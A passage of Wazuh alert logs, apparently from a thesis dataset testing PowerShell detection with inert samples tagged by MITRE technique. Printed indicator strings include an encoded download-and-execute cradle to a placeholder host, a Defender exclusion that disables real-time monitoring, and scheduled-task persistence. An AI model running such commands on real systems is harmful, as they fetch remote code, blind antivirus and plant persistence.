19efc387-33f1-477a-b64c-335091f3cf19\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-190'; $result=&amp; { Get-Process -ErrorAction SilentlyContinue | Sort-Object Id | Select-Object -First 3 Name,Id }; $result | Out-String | Write-Output; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"19efc387-33f1-477a-b64c-335091f3cf19\"}}}","id":"1784281026.534374","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executing process discovery","firedtimes":9,"groups":["windows"," powershell"],"id":"91815","level":4,"mail":false,"mitre":{"id":["T1057"],"tactic":["Discovery"],"technique":["Process Discovery"]}},"timestamp":"2026-07-17T11:37:06.144+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"138ec8ac-5436-49ed-8fac-9a12d9eb79ab","scriptBlockText":"$sampleId='PST-191'; $encoded='JAB4AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AQwBvAG0ATwBiAGoAZQBjAHQAIABNAHMAWABtAGwAMgAuAFMAZQByAHYAZQByAFgAbQBsAEgAdAB0AHAAOwAgACQAeAAuAE8AcABlAG4AKAAnAEcARQBUACcALAAnAGgAdAB0AHAAcwA6AC8ALwB4AG0AbAAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AdABhAHMAawAnACwAJABmAGEAbABzAGUAKQA7ACAAJAB4AC4AUwBlAG4AZAAoACkAOwAgAEkARQBYACAAJAB4AC4AUgBlAHMAcABvAG4AcwBlAFQAZQB4AHQA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723190","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-191'; $encoded='JAB4AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AQwBvAG0ATwBiAGoAZQBjAHQAIABNAHMAWABtAGwAMgAuAFMAZQByAHYAZQByAFgAbQBsAEgAdAB0AHAAOwAgACQAeAAuAE8AcABlAG4AKAAnAEcARQBUACcALAAnAGgAdAB0AHAAcwA6AC8ALwB4AG0AbAAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AdABhAHMAawAnACwAJABmAGEAbABzAGUAKQA7ACAAJAB4AC4AUwBlAG4AZAAoACkAOwAgAEkARQBYACAAJAB4AC4AUgBlAHMAcABvAG4AcwBlAFQAZQB4AHQA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 138ec8ac-5436-49ed-8fac-9a12d9eb79ab\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:05.9325682Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:05.9325682Z\",\"eventRecordID\":\"723190\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-191'; $encoded='JAB4AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AQwBvAG0ATwBiAGoAZQBjAHQAIABNAHMAWABtAGwAMgAuAFMAZQByAHYAZQByAFgAbQBsAEgAdAB0AHAAOwAgACQAeAAuAE8AcABlAG4AKAAnAEcARQBUACcALAAnAGgAdAB0AHAAcwA6AC8ALwB4AG0AbAAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AdABhAHMAawAnACwAJABmAGEAbABzAGUAKQA7ACAAJAB4AC4AUwBlAG4AZAAoACkAOwAgAEkARQBYACAAJAB4AC4AUgBlAHMAcABvAG4AcwBlAFQAZQB4AHQA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 138ec8ac-5436-49ed-8fac-9a12d9eb79ab\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-191'; $encoded='JAB4AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AQwBvAG0ATwBiAGoAZQBjAHQAIABNAHMAWABtAGwAMgAuAFMAZQByAHYAZQByAFgAbQBsAEgAdAB0AHAAOwAgACQAeAAuAE8AcABlAG4AKAAnAEcARQBUACcALAAnAGgAdAB0AHAAcwA6AC8ALwB4AG0AbAAuAGUAeABhAG0AcABsAGUALgBpAG4AdgBhAGwAaQBkAC8AdABhAHMAawAnACwAJABmAGEAbABzAGUAKQA7ACAAJAB4AC4AUwBlAG4AZAAoACkAOwAgAEkARQBYACAAJAB4AC4AUgBlAHMAcABvAG4AcwBlAFQAZQB4AHQA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"138ec8ac-5436-49ed-8fac-9a12d9eb79ab\"}}}","id":"1784281026.541001","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":18,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:37:06.160+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d0fe4e8d-2c97-44bb-9f69-459b341373c0","scriptBlockText":"$sampleId='PST-192'; $encoded='JABjAG0AZAA9ACgAJwBJAG4AdgAnACsAJwBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AJwApADsAIAAmACAAKABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIAAkAGMAbQBkACkAIAAiAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAJwBUAEgARQBTAEkAUwAtAEkATgBFAFIAVAAnACIA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723194","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-192'; $encoded='JABjAG0AZAA9ACgAJwBJAG4AdgAnACsAJwBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AJwApADsAIAAmACAAKABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIAAkAGMAbQBkACkAIAAiAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAJwBUAEgARQBTAEkAUwAtAEkATgBFAFIAVAAnACIA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d0fe4e8d-2c97-44bb-9f69-459b341373c0\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:06.2776916Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:06.2776916Z\",\"eventRecordID\":\"723194\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-192'; $encoded='JABjAG0AZAA9ACgAJwBJAG4AdgAnACsAJwBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AJwApADsAIAAmACAAKABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIAAkAGMAbQBkACkAIAAiAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAJwBUAEgARQBTAEkAUwAtAEkATgBFAFIAVAAnACIA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d0fe4e8d-2c97-44bb-9f69-459b341373c0\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-192'; $encoded='JABjAG0AZAA9ACgAJwBJAG4AdgAnACsAJwBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AJwApADsAIAAmACAAKABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIAAkAGMAbQBkACkAIAAiAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAJwBUAEgARQBTAEkAUwAtAEkATgBFAFIAVAAnACIA'; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d0fe4e8d-2c97-44bb-9f69-459b341373c0\"}}}","id":"1784281027.541001","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":19,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:37:07.231+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"f873d314-9767-4826-8084-d686f1637f05","scriptBlockText":"$sampleId='PST-193'; @{host=$env:COMPUTERNAME; user=$env:USERNAME} | ConvertTo-Json; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723209","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-193'; @{host=$env:COMPUTERNAME; user=$env:USERNAME} | ConvertTo-Json; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: f873d314-9767-4826-8084-d686f1637f05\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:06.6086268Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:06.6086268Z\",\"eventRecordID\":\"723209\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-193'; @{host=$env:COMPUTERNAME; user=$env:USERNAME} | ConvertTo-Json; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: f873d314-9767-4826-8084-d686f1637f05\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-193'; @{host=$env:COMPUTERNAME; user=$env:USERNAME} | ConvertTo-Json; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"f873d314-9767-4826-8084-d686f1637f05\"}}}","id":"1784281027.544864","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":20,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:37:07.271+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"f3ae28ae-de27-4baa-8698-de7b37cd7819","scriptBlockText":"$sampleId='PST-194'; $indicator='Set-MpP' + 'referenc' + 'e -Exclusio' + 'nPath ''C:' + '\\\\__THESI' + 'S_INERT__' + ''' -DisableR' + 'ealtimeMo' + 'nitoring' + ' $t' + 'rue'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723214","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-194'; $indicator='Set-MpP' + 'referenc' + 'e -Exclusio' + 'nPath ''C:' + '\\__THESI' + 'S_INERT__' + ''' -DisableR' + 'ealtimeMo' + 'nitoring' + ' $t' + 'rue'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: f3ae28ae-de27-4baa-8698-de7b37cd7819\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:06.9309904Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:06.9309904Z\",\"eventRecordID\":\"723214\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-194'; $indicator='Set-MpP' + 'referenc' + 'e -Exclusio' + 'nPath ''C:' + '\\\\__THESI' + 'S_INERT__' + ''' -DisableR' + 'ealtimeMo' + 'nitoring' + ' $t' + 'rue'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: f3ae28ae-de27-4baa-8698-de7b37cd7819\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-194'; $indicator='Set-MpP' + 'referenc' + 'e -Exclusio' + 'nPath ''C:' + '\\\\\\\\__THESI' + 'S_INERT__' + ''' -DisableR' + 'ealtimeMo' + 'nitoring' + ' $t' + 'rue'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"f3ae28ae-de27-4baa-8698-de7b37cd7819\"}}}","id":"1784281027.548151","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:07.334+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"4e3f2ba5-e829-4b29-844c-bc782c9f3793","scriptBlockText":"$sampleId='PST-195'; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled, AntivirusEnabled; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723219","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-195'; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled, AntivirusEnabled; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 4e3f2ba5-e829-4b29-844c-bc782c9f3793\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:07.2699096Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:07.2699096Z\",\"eventRecordID\":\"723219\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-195'; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled, AntivirusEnabled; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 4e3f2ba5-e829-4b29-844c-bc782c9f3793\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-195'; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled, AntivirusEnabled; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"4e3f2ba5-e829-4b29-844c-bc782c9f3793\"}}}","id":"1784281028.548151","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:08.288+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"3688d21c-b3d1-4264-9123-805d9518fc6e","scriptBlockText":"$sampleId='PST-196'; $s = 'key1=value1;key2=value2|owner=ops;scope=[local];state={ok}'; Write-Output $s; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723225","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-196'; $s = 'key1=value1;key2=value2|owner=ops;scope=[local];state={ok}'; Write-Output $s; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 3688d21c-b3d1-4264-9123-805d9518fc6e\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:07.7113742Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:07.7113742Z\",\"eventRecordID\":\"723225\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-196'; $s = 'key1=value1;key2=value2|owner=ops;scope=[local];state={ok}'; Write-Output $s; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 3688d21c-b3d1-4264-9123-805d9518fc6e\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-196'; $s = 'key1=value1;key2=value2|owner=ops;scope=[local];state={ok}'; Write-Output $s; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"3688d21c-b3d1-4264-9123-805d9518fc6e\"}}}","id":"1784281028.548151","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:08.304+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"5b5b79ea-1af8-41ef-8ee2-d6e4769f87c3","scriptBlockText":"$sampleId='PST-197'; $indicator='Register-ScheduledTask -TaskName ''UpdateCheck'' -Action (New-ScheduledTaskAction -Execute ''powershell.exe'' -Argument ''-NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA'')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"723251","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-197'; $indicator='Register-ScheduledTask -TaskName ''UpdateCheck'' -Action (New-ScheduledTaskAction -Execute ''powershell.exe'' -Argument ''-NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA'')'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 5b5b79ea-1af8-41ef-8ee2-d6e4769f87c3\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:37:08.0606253Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:37:08.0606253Z\",\"eventRecordID\":\"723251\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-197'; $indicator='Register-ScheduledTask -TaskName ''UpdateCheck'' -Action (New-ScheduledTaskAction -Execute ''powershell.exe'' -Argument ''-NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA'')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 5b5b79ea-1af8-41ef-8ee2-d6e4769f87c3\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-197'; $indicator='Register-ScheduledTask -TaskName ''UpdateCheck'' -Action (New-ScheduledTaskAction -Execute ''powershell.exe'' -Argument ''-NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA'')'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"5b5b79ea-1af8-41ef-8ee2-d6e4769f87c3\"}}}","id":"1784281028.548151","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:37:08.380+0200"}
